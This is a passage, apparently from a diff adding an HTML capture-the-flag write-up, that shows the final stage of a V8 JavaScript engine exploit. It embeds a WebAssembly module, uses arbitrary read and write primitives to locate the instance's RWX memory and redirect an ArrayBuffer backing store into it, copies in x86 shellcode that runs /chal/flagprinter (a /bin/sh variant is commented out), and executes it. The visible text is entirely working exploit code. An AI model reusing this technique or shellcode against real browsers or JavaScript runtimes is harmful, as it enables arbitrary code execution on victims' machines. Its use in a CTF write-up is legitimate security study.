class="op">,</span><span class="dv">4</span><span class="op">,</span><span class="dv">132</span><span class="op">,</span><span class="dv">128</span><span class="op">,</span><span class="dv">128</span><span class="op">,</span><span class="dv">128</span><span class="op">,</span><span class="dv">0</span><span class="op">,</span><span class="dv">1</span><span class="op">,</span><span class="dv">112</span><span class="op">,</span><span class="dv">0</span><span class="op">,</span><span class="dv">0</span><span class="op">,</span><span class="dv">5</span><span class="op">,</span><span class="dv">131</span><span class="op">,</span><span class="dv">128</span><span class="op">,</span><span class="dv">128</span><span class="op">,</span><span class="dv">128</span><span class="op">,</span><span class="dv">0</span><span class="op">,</span><span class="dv">1</span><span class="op">,</span><span class="dv">0</span><span class="op">,</span><span class="dv">1</span><span class="op">,</span><span class="dv">6</span><span class="op">,</span><span class="dv">129</span><span class="op">,</span><span class="dv">128</span><span class="op">,</span><span class="dv">128</span><span class="op">,</span><span class="dv">128</span><span class="op">,</span><span class="dv">0</span><span class="op">,</span><span class="dv">0</span><span class="op">,</span><span class="dv">7</span><span class="op">,</span><span class="dv">145</span><span class="op">,</span><span class="dv">128</span><span class="op">,</span><span class="dv">128</span><span class="op">,</span><span class="dv">128</span><span class="op">,</span><span class="dv">0</span><span class="op">,</span><span class="dv">2</span><span class="op">,</span><span class="dv">6</span><span class="op">,</span><span class="dv">109</span><span class="op">,</span><span class="dv">101</span><span class="op">,</span><span class="dv">109</span><span class="op">,</span><span class="dv">111</span><span class="op">,</span><span class="dv">114</span><span class="op">,</span><span class="dv">121</span><span class="op">,</span><span class="dv">2</span><span class="op">,</span><span class="dv">0</span><span class="op">,</span><span class="dv">4</span><span class="op">,</span><span class="dv">109</span><span class="op">,</span><span class="dv">97</span><span class="op">,</span><span class="dv">105</span><span class="op">,</span><span class="dv">110</span><span class="op">,</span><span class="dv">0</span><span class="op">,</span><span class="dv">0</span><span class="op">,</span><span class="dv">10</span><span class="op">,</span><span class="dv">138</span><span class="op">,</span><span class="dv">128</span><span class="op">,</span><span class="dv">128</span><span class="op">,</span><span class="dv">128</span><span class="op">,</span><span class="dv">0</span><span class="op">,</span><span class="dv">1</span><span class="op">,</span><span class="dv">132</span><span class="op">,</span><span class="dv">128</span><span class="op">,</span><span class="dv">128</span><span class="op">,</span><span class="dv">128</span><span class="op">,</span><span class="dv">0</span><span class="op">,</span><span class="dv">0</span><span class="op">,</span><span class="dv">65</span><span class="op">,</span><span class="dv">42</span><span class="op">,</span><span class="dv">11</span>])<span class="op">;</span></span>
+<span id="cb23-112"><a href="#cb23-112" aria-hidden="true" tabindex="-1"></a><span class="kw">var</span> wasm_mod <span class="op">=</span> <span class="kw">new</span> WebAssembly<span class="op">.</span><span class="fu">Module</span>(wasm_code)<span class="op">;</span></span>
+<span id="cb23-113"><a href="#cb23-113" aria-hidden="true" tabindex="-1"></a><span class="kw">var</span> wasm_instance <span class="op">=</span> <span class="kw">new</span> WebAssembly<span class="op">.</span><span class="fu">Instance</span>(wasm_mod)<span class="op">;</span></span>
+<span id="cb23-114"><a href="#cb23-114" aria-hidden="true" tabindex="-1"></a><span class="kw">var</span> wasm_func <span class="op">=</span> wasm_instance<span class="op">.</span><span class="at">exports</span><span class="op">.</span><span class="at">main</span><span class="op">;</span></span>
+<span id="cb23-115"><a href="#cb23-115" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb23-116"><a href="#cb23-116" aria-hidden="true" tabindex="-1"></a><span class="bu">console</span><span class="op">.</span><span class="fu">log</span>(<span class="st">&#39;[+] wasm instance at 0x&#39;</span> <span class="op">+</span> <span class="fu">addrof</span>(wasm_instance)<span class="op">.</span><span class="fu">toString</span>(<span class="dv">16</span>))</span>
+<span id="cb23-117"><a href="#cb23-117" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb23-118"><a href="#cb23-118" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb23-119"><a href="#cb23-119" aria-hidden="true" tabindex="-1"></a><span class="co">// rwx ptr can be found at wasm_instance+0x68</span></span>
+<span id="cb23-120"><a href="#cb23-120" aria-hidden="true" tabindex="-1"></a><span class="kw">var</span> addr_to_read <span class="op">=</span> <span class="fu">addrof</span>(wasm_instance) <span class="op">+</span> <span class="bn">0x68</span>n<span class="op">;</span></span>
+<span id="cb23-121"><a href="#cb23-121" aria-hidden="true" tabindex="-1"></a><span class="kw">var</span> rwx <span class="op">=</span> <span class="fu">arb_r</span>(addr_to_read)</span>
+<span id="cb23-122"><a href="#cb23-122" aria-hidden="true" tabindex="-1"></a><span class="co">// this pointer is not compressed, it exists outside the v8 heap</span></span>
+<span id="cb23-123"><a href="#cb23-123" aria-hidden="true" tabindex="-1"></a><span class="bu">console</span><span class="op">.</span><span class="fu">log</span>(<span class="st">&#39;[+] RWX segment at 0x&#39;</span> <span class="op">+</span> rwx<span class="op">.</span><span class="fu">toString</span>(<span class="dv">16</span>))</span>
+<span id="cb23-124"><a href="#cb23-124" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb23-125"><a href="#cb23-125" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb23-126"><a href="#cb23-126" aria-hidden="true" tabindex="-1"></a><span class="co">//https://defuse.ca/online-x86-assembler.htm#disassembly</span></span>
+<span id="cb23-127"><a href="#cb23-127" aria-hidden="true" tabindex="-1"></a><span class="co">// execve /chal/flagprinter</span></span>
+<span id="cb23-128"><a href="#cb23-128" aria-hidden="true" tabindex="-1"></a><span class="kw">var</span> shellcode <span class="op">=</span> [<span class="bn">0x48</span><span class="op">,</span> <span class="bn">0xC7</span><span class="op">,</span> <span class="bn">0xC0</span><span class="op">,</span> <span class="bn">0x3B</span><span class="op">,</span> <span class="bn">0x00</span><span class="op">,</span> <span class="bn">0x00</span><span class="op">,</span> <span class="bn">0x00</span><span class="op">,</span> <span class="bn">0x48</span><span class="op">,</span> <span class="bn">0x31</span><span class="op">,</span> <span class="bn">0xF6</span><span class="op">,</span> <span class="bn">0x48</span><span class="op">,</span> <span class="bn">0x31</span><span class="op">,</span> <span class="bn">0xD2</span><span class="op">,</span> <span class="bn">0x48</span><span class="op">,</span> <span class="bn">0xC7</span><span class="op">,</span> <span class="bn">0xC1</span><span class="op">,</span> <span class="bn">0x72</span><span class="op">,</span> <span class="bn">0x00</span><span class="op">,</span> <span class="bn">0x00</span><span class="op">,</span> <span class="bn">0x00</span><span class="op">,</span> <span class="bn">0x51</span><span class="op">,</span> <span class="bn">0x48</span><span class="op">,</span> <span class="bn">0xB9</span><span class="op">,</span> <span class="bn">0x61</span><span class="op">,</span> <span class="bn">0x67</span><span class="op">,</span> <span class="bn">0x70</span><span class="op">,</span> <span class="bn">0x72</span><span class="op">,</span> <span class="bn">0x69</span><span class="op">,</span> <span class="bn">0x6E</span><span class="op">,</span> <span class="bn">0x74</span><span class="op">,</span> <span class="bn">0x65</span><span class="op">,</span> <span class="bn">0x51</span><span class="op">,</span> <span class="bn">0x48</span><span class="op">,</span> <span class="bn">0xB9</span><span class="op">,</span> <span class="bn">0x2F</span><span class="op">,</span> <span class="bn">0x63</span><span class="op">,</span> <span class="bn">0x68</span><span class="op">,</span> <span class="bn">0x61</span><span class="op">,</span> <span class="bn">0x6C</span><span class="op">,</span> <span class="bn">0x2F</span><span class="op">,</span> <span class="bn">0x66</span><span class="op">,</span> <span class="bn">0x6C</span><span class="op">,</span> <span class="bn">0x51</span><span class="op">,</span> <span class="bn">0x48</span><span class="op">,</span> <span class="bn">0x89</span><span class="op">,</span> <span class="bn">0xE7</span><span class="op">,</span> <span class="bn">0x0F</span><span class="op">,</span> <span class="bn">0x05</span>]</span>
+<span id="cb23-129"><a href="#cb23-129" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb23-130"><a href="#cb23-130" aria-hidden="true" tabindex="-1"></a><span class="co">// execve /bin/sh</span></span>
+<span id="cb23-131"><a href="#cb23-131" aria-hidden="true" tabindex="-1"></a><span class="co">//shellcode = [0x48, 0xC7, 0xC0, 0x3B, 0x00, 0x00, 0x00, 0x48, 0x31, 0xF6, 0x48, 0x31, 0xD2, 0x48, 0xB9, 0x2F, 0x62, 0x69, 0x6E, 0x2F, 0x73, 0x68, 0x00, 0x51, 0x48, 0x89, 0xE7, 0x0F, 0x05]</span></span>
+<span id="cb23-132"><a href="#cb23-132" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb23-133"><a href="#cb23-133" aria-hidden="true" tabindex="-1"></a><span class="co">// set up a typed array to do writing outside the heap</span></span>
+<span id="cb23-134"><a href="#cb23-134" aria-hidden="true" tabindex="-1"></a><span class="co">// the ArrayBuffer exists within the v8 heap, so we can write to it with</span></span>
+<span id="cb23-135"><a href="#cb23-135" aria-hidden="true" tabindex="-1"></a><span class="co">// our current arb_w setup</span></span>
+<span id="cb23-136"><a href="#cb23-136" aria-hidden="true" tabindex="-1"></a><span class="co">// the backing store ptr points to outside the v8 heap, so we can overwrite</span></span>
+<span id="cb23-137"><a href="#cb23-137" aria-hidden="true" tabindex="-1"></a><span class="co">// it with the real address of our rwx region</span></span>
+<span id="cb23-138"><a href="#cb23-138" aria-hidden="true" tabindex="-1"></a><span class="kw">var</span> buf <span class="op">=</span> <span class="kw">new</span> <span class="bu">ArrayBuffer</span>(<span class="bn">0x100</span>)</span>
+<span id="cb23-139"><a href="#cb23-139" aria-hidden="true" tabindex="-1"></a><span class="kw">var</span> uint8_arr <span class="op">=</span> <span class="kw">new</span> <span class="bu">Uint8Array</span>(buf)</span>
+<span id="cb23-140"><a href="#cb23-140" aria-hidden="true" tabindex="-1"></a><span class="kw">var</span> buf_addr <span class="op">=</span> <span class="fu">addrof</span>(buf)</span>
+<span id="cb23-141"><a href="#cb23-141" aria-hidden="true" tabindex="-1"></a><span class="co">// offset to backing store ptr at 0x60</span></span>
+<span id="cb23-142"><a href="#cb23-142" aria-hidden="true" tabindex="-1"></a><span class="kw">var</span> backing_addr <span class="op">=</span> buf_addr <span class="op">+</span> <span class="bn">0x60</span>n</span>
+<span id="cb23-143"><a href="#cb23-143" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb23-144"><a href="#cb23-144" aria-hidden="true" tabindex="-1"></a><span class="bu">console</span><span class="op">.</span><span class="fu">log</span>(<span class="st">&#39;[+] Writing over ArrayBuffer backing store at 0x&#39;</span> <span class="op">+</span> backing_addr<span class="op">.</span><span class="fu">toString</span>(<span class="dv">16</span>))</span>
+<span id="cb23-145"><a href="#cb23-145" aria-hidden="true" tabindex="-1"></a><span class="co">// overwrite backing store ptr so all uint8_arr access happen in the rwx segment</span></span>
+<span id="cb23-146"><a href="#cb23-146" aria-hidden="true" tabindex="-1"></a><span class="fu">arb_w</span>(backing_addr<span class="op">,</span> rwx)</span>
+<span id="cb23-147"><a href="#cb23-147" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb23-148"><a href="#cb23-148" aria-hidden="true" tabindex="-1"></a><span class="bu">console</span><span class="op">.</span><span class="fu">log</span>(<span class="st">&#39;[+] Copying shellcode to rwx segment&#39;</span>)</span>
+<span id="cb23-149"><a href="#cb23-149" aria-hidden="true" tabindex="-1"></a><span class="co">// backing store now points to the rwx segment, copy in our shellcode</span></span>
+<span id="cb23-150"><a href="#cb23-150" aria-hidden="true" tabindex="-1"></a><span class="cf">for</span> (<span class="kw">let</span> i <span class="op">=</span> <span class="dv">0</span><span class="op">;</span> i <span class="op">&lt;</span> shellcode<span class="op">.</span><span class="at">length</span><span class="op">;</span> i<span class="op">++</span>) {</span>
+<span id="cb23-151"><a href="#cb23-151" aria-hidden="true" tabindex="-1"></a>    uint8_arr[i] <span class="op">=</span> shellcode[i]</span>
+<span id="cb23-152"><a href="#cb23-152" aria-hidden="true" tabindex="-1"></a>}</span>
+<span id="cb23-153"><a href="#cb23-153" aria-hidden="true" tabindex="-1"></a><span class="bu">console</span><span class="op">.</span><span class="fu">log</span>(<span class="st">&#39;[+] Shellcode copied, executing&#39;</span>)</span>
+<span id="cb23-154"><a href="#cb23-154" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb23-155"><a href="#cb23-155" aria-hidden="true" tabindex="-1"></a><span class="co">// run shellcode</span></span>
+<span id="cb23-156"><a href="#cb23-156" aria-hidden="true" tabindex="-1"></a><span class="fu">wasm_func</span>()<span class="op">;</span></span></code></pre></div>
+  <div class="debug-grid"></div>
+  <script src="/index.js"></script>
+</body>
+</html>
